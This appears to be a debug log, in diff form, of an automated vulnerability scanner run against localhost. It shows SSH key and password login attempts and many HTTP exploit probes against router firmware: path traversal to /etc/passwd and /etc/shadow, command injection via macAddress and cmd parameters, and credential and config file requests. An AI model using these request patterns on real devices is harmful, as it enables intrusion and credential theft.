+2019-02-24 10:31:58,280 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:58,291 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:31:58,292 DEBUG paramiko.transport       starting thread (client mode): 0xa47bdcc0
+2019-02-24 10:31:58,292 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:58,299 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:58,299 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:58,300 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:58,300 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:58,300 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:58,300 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:58,301 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:58,301 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:58,302 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:58,303 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:58,303 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:58,303 DEBUG paramiko.transport       Trying SSH key b'22c8a9c301a01731a543f2704a1c55f6'
+2019-02-24 10:31:58,346 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:58,356 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:31:58,357 DEBUG paramiko.transport       starting thread (client mode): 0xa47d46d8
+2019-02-24 10:31:58,358 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:58,362 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:58,362 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:58,364 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:58,364 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:58,364 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:58,364 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:58,364 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:58,364 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:58,366 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:58,367 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:58,367 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:58,367 DEBUG paramiko.transport       Trying SSH key b'713ab018e26c41184e561efdd2499766'
+2019-02-24 10:31:58,391 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:31:58,410 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:58,420 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:31:58,421 DEBUG paramiko.transport       starting thread (client mode): 0xa47dd080
+2019-02-24 10:31:58,421 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:58,427 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:58,427 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:58,429 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:58,429 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:58,429 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:58,429 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:58,429 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:58,429 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:58,431 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:58,431 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:58,432 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:58,432 DEBUG paramiko.transport       Trying SSH key b'f09610b7d63838def4b4d2df5ef82d74'
+2019-02-24 10:31:58,457 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:31:58,474 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:58,488 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:31:58,490 DEBUG paramiko.transport       starting thread (client mode): 0xa47dda58
+2019-02-24 10:31:58,491 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:31:58,504 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:31:58,504 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:31:58,508 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:31:58,509 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:31:58,509 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:31:58,510 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:31:58,510 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:31:58,510 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:31:58,515 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:31:58,516 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:31:58,518 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:31:58,518 DEBUG paramiko.transport       Trying SSH key b'049bf5dede27105ab88dab79cd17e857'
+2019-02-24 10:31:58,520 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:31:58,560 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:31:58,575 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:31:58,588 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:31:58,676 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:32:00,622 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,624 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /diag.html?images/ HTTP/1.1" 404 169
+2019-02-24 10:32:00,628 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,631 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard HTTP/1.1" 404 169
+2019-02-24 10:32:00,636 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,639 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd HTTP/1.1" 404 None
+2019-02-24 10:32:00,644 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,647 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /getcfg.php HTTP/1.1" 404 None
+2019-02-24 10:32:00,653 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,655 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /DataStore/990_user_account.js?index=0&pagesize=10 HTTP/1.1" 404 571
+2019-02-24 10:32:00,660 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,663 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /diagnostic.php HTTP/1.1" 404 None
+2019-02-24 10:32:00,667 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,670 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/dget.cgi?cmd=wifi_AP1_ssid,wifi_AP1_hidden,wifi_AP1_passphrase,wifi_AP1_passphrase_wep,wifi_AP1_security_mode,wifi_AP1_enable,get_mac_filter_list,get_mac_filter_switch,get_client_list,get_mac_address,get_wps_dev_pin,get_wps_mode,get_wps_enable,get_wps_current_time&_=1458458152703 HTTP/1.1" 404 169
+2019-02-24 10:32:00,677 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,680 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /command.php HTTP/1.1" 404 None
+2019-02-24 10:32:00,684 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,686 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /HNAP1/ HTTP/1.1" 404 169
+2019-02-24 10:32:00,691 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,693 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /ayefeaturesconvert.js HTTP/1.1" 404 169
+2019-02-24 10:32:00,699 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,701 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /setSystemCommand HTTP/1.1" 404 169
+2019-02-24 10:32:00,705 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,707 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /hidden_info.html HTTP/1.1" 404 169
+2019-02-24 10:32:00,712 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,715 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /apply.cgi HTTP/1.1" 404 169
+2019-02-24 10:32:00,720 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,722 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&var:language=es_es&var:page= HTTP/1.1" 404 169
+2019-02-24 10:32:00,726 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,728 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /help/../../../../../../../../../../../../../../../../etc/shadow HTTP/1.1" 400 173
+2019-02-24 10:32:00,733 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,735 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /userRpm/DebugResultRpm.htm?cmd=echo%20f5Sly9gXcQI03g1MDHnyB6qOvQJiNchL&usr=osteam&passwd=5up HTTP/1.1" 404 169
+2019-02-24 10:32:00,741 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,743 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /config.bin HTTP/1.1" 404 169
+2019-02-24 10:32:00,748 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,750 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /cgi?2 HTTP/1.1" 404 169
+2019-02-24 10:32:00,755 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,757 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /ping.cgi HTTP/1.1" 404 169
+2019-02-24 10:32:00,762 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,765 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardData102.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20gbHgyHP7BmBzb0EVttVlizsEenXAXt0S;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:32:00,771 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,774 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardData103.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20gbHgyHP7BmBzb0EVttVlizsEenXAXt0S;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:32:00,778 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,781 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardDataNA.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20gbHgyHP7BmBzb0EVttVlizsEenXAXt0S;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:32:00,787 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,790 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardDataWW.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20gbHgyHP7BmBzb0EVttVlizsEenXAXt0S;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:32:00,794 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,797 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /boardDataJP.php?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;echo%20gbHgyHP7BmBzb0EVttVlizsEenXAXt0S;%20echo%20 HTTP/1.1" 404 None
+2019-02-24 10:32:00,801 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,803 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home HTTP/1.1" 404 169
+2019-02-24 10:32:00,809 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,812 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:language=en_us&var:page=BAS_bpa HTTP/1.1" 404 169
+2019-02-24 10:32:00,816 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,818 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "HEAD / HTTP/1.1" 200 0
+2019-02-24 10:32:00,824 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,828 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /login_handler.php HTTP/1.1" 404 None
+2019-02-24 10:32:00,834 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,835 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:32:00,840 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,841 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:32:00,847 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,849 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /cgi-bin/cgiSrv.cgi HTTP/1.1" 404 169
+2019-02-24 10:32:00,851 DEBUG paramiko.transport       starting thread (client mode): 0xb42b8fd0
+2019-02-24 10:32:00,852 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:32:00,864 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:32:00,865 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:32:00,868 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:32:00,868 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:32:00,868 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:32:00,869 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:32:00,869 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:32:00,869 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:32:00,875 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:32:00,876 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:32:00,877 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:32:00,917 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:32:00,936 INFO paramiko.transport       Authentication (password) failed.
+2019-02-24 10:32:00,941 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,943 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /shell?echo%20j9l7vOXVbWYoGlxI HTTP/1.1" 404 169
+2019-02-24 10:32:00,947 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,949 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /../../../../../etc/passwd HTTP/1.1" 400 173
+2019-02-24 10:32:00,954 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,956 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /device.rsp?opt=user&cmd=list HTTP/1.1" 404 169
+2019-02-24 10:32:00,960 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,962 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /system.ini?loginuse&loginpas HTTP/1.1" 404 169
+2019-02-24 10:32:00,969 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,971 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /system.ini?loginuse&loginpas HTTP/1.1" 404 169
+2019-02-24 10:32:00,975 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,977 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET //etc/RT2870STA.dat HTTP/1.1" 404 169
+2019-02-24 10:32:00,982 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,984 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /get_status.cgi HTTP/1.1" 404 169
+2019-02-24 10:32:00,988 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,990 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/check.cgi?file=../../../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:32:00,995 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:00,996 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/chklogin.cgi?file=../../../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:32:01,002 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,004 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/readfile.cgi?query=ADMINID HTTP/1.1" 404 169
+2019-02-24 10:32:01,010 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,011 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:32:01,016 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,018 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/readfile.cgi?query=ADMINID HTTP/1.1" 404 169
+2019-02-24 10:32:01,024 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,027 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:32:01,031 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,033 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /frame/GetConfig HTTP/1.1" 404 169
+2019-02-24 10:32:01,040 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,040 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:32:01,043 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /configfile.dump?action=get HTTP/1.1" 404 169
+2019-02-24 10:32:01,049 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:32:01,061 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /configfile.dump.backup HTTP/1.1" 404 169
+2019-02-24 10:32:01,075 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
